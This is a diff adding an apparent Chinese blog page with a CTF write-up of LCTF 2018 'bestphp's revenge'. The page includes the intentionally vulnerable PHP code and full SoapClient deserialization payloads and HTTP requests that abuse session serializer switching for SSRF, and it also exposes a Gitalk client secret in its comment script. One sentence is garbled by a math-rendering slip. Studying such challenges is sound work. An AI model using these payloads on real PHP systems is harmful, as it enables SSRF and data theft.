@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>LCTF bestphp’s revenge（SOAP反序列化） |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="LCTF bestphp’s revenge（SOAP反序列化） |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="LCTF bestphp’s revenge（SOAP反序列化）"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/lctf-bestphps-revengesoap-fan-xu-lie-hua/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>LCTF bestphp’s revenge（SOAP反序列化）</h1>
+            <span class="meta">
+            	Posted on
+              2020-01-26，5 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="indexphp">index.php</h1>
+<pre><code> &lt;?php
+highlight_file(__FILE__);
+$b = 'implode';
+call_user_func($_GET['f'], $_POST);
+session_start();
+if (isset($_GET['name'])) {
+    $_SESSION['name'] = $_GET['name'];
+}
+var_dump($_SESSION);
+$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
+call_user_func($b, $a);
+?&gt;
+</code></pre>
+<!-- more -->
+<p>#flag.php</p>
+<pre><code>session_start();
+echo 'only localhost can get flag!';
+$flag = 'LCTF{*************************}';
+if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){
+       $_SESSION['flag'] = $flag;
+   }
+only localhost can get flag!
+</code></pre>
+<p>这个题需要的知识点有点多。<br>
+1.Session在写入和读取时。都会进行序列化/反序列化<br>
+2.利用soap进行SSRF<br>
+3.call_user_func的调用<br>
+<strong>首先了解下什么是SOAP</strong></p>
+<pre><code>SOAP(简单对象访问协议)用来链接Web服务/客户端和Web服务之间的接口。采用HTTP协议作为底层通讯协议。XML作为数据传输的格式
+</code></pre>
+<p>这里我用phpstudy的环境。自己安装的死活找不到SOAP</p>
+<pre><code>&lt;?php
+$a = new SoapClient(null,array('uri'=&gt;'http://192.168.0.159:8080', 'location'=&gt;'http://192.168.0.159:8080'));
+$b = serialize($a);
+echo $b;
+$c = unserialize($b);
+$c-&gt;a();
+?&gt;
+</code></pre>
+<p>当调用Soap一个不存在的函数时。触发内置函数中的__CALL魔法函数。就会造成SSRF<br>
+<img src="https://guokeya.github.io/post-images/1580005989312.png" alt="" loading="lazy"></p>
+<p>第一次调用</p>
+<pre><code>?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+POST:serialize_handler=php_serialize
+</code></pre>
+<p>将默认解析Session的php引擎变成了php_serialize引擎<br>
+session的name值就为<code>|O:10:&quot;SoapClient&quot;:3:{s:3:&quot;uri&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:13:&quot;_soap_version&quot;;i:1;}</code><br>
+以序列化的形式。存入了/tmp/xxxx。修改引擎是在最后一行代码<br>
+所以。这里还是由PHP引擎传入的序列化session内容</p>
+<pre><code>name|s:139:&quot;|O:10:&quot;SoapClient&quot;:3:{s:3:&quot;uri&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:13:&quot;_soap_version&quot;;i:1;}&quot;;
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1579869946101.png" alt="" loading="lazy"><br>
+再正常访问一下。由于Session在读取的时候会反序列化。而我们已经将解析引擎变成了php_serialize<br>
+会以|作为分割<br>
+所以将以下的内容反序列化</p>
+<pre><code>O:10:&quot;SoapClient&quot;:3:{s:3:&quot;uri&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:13:&quot;_soap_version&quot;;i:1;}
+</code></pre>
+<p>成为一个Soap对象<br>
+<img src="https://guokeya.github.io/post-images/1579870348275.png" alt="" loading="lazy"><br>
+现在Session里存的。时一个soap对象<br>
+第二次访问：</p>
+<pre><code>POST /?f=extract HTTP/1.1
+Host: 192.168.75.130:23333
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=riddlertest
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 16
+
+b=call_user_func
+</code></pre>
+<p>用extract变量覆盖。<code>call_user_func(call_user_func(array($_SESSION,'xxxxxxctf')))</code><br>
+等同于<br>
+<code>call_user_func(array($_SESSION,'xxxxxxctf'))</code><br>
+当call_user_func函数的第一个参数是数组时。会将数组的第一个值当做类。第二个值作为类中的函数<br>
+调用的时<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>S</mi><mi>S</mi><mi>I</mi><mi>O</mi><mi>N</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">第</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">内</mi><mi mathvariant="normal">容</mi><mo>−</mo><mo>&gt;</mo><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>c</mi><mi>t</mi><mi>f</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">第</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">步</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">。</mi></mrow><annotation encoding="application/x-tex">_SESSION的第一个内容-&gt;xxxxxctf函数
+在第一步中。</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">内</span><span class="mord cjk_fallback">容</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">x</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">。</span></span></span></span>_SESSION的值就是SOAP对象。所以这里调用了SOAP对象的xxxxctf。由于没有xxxxctf这个函数。所以导致触发了SOAP的魔法函数。造成SSRF。<br>
+第一次中。我们已经将SOAP反序列化。成功赋值了。这里直接调用<br>
+。由于SOAP造成SSRF访问了flag.php。SOAP就有了一个PHPSESSID。并且SOAP函数内。多了很多内置的值<br>
+<img src="https://guokeya.github.io/post-images/1579870722668.png" alt="" loading="lazy"><br>
+在flag.php。会将flag赋值给<code>$_SESSION['flag']</code><br>
+只要我们将session替换。然后进入index.php。index.php会var_dump($_SESSION)<br>
+将flag输出</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/nctf2019sqliregexp-zhu/">
+              <span class="post-title">
+                [NCTF2019]SQLi(regexp注入)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
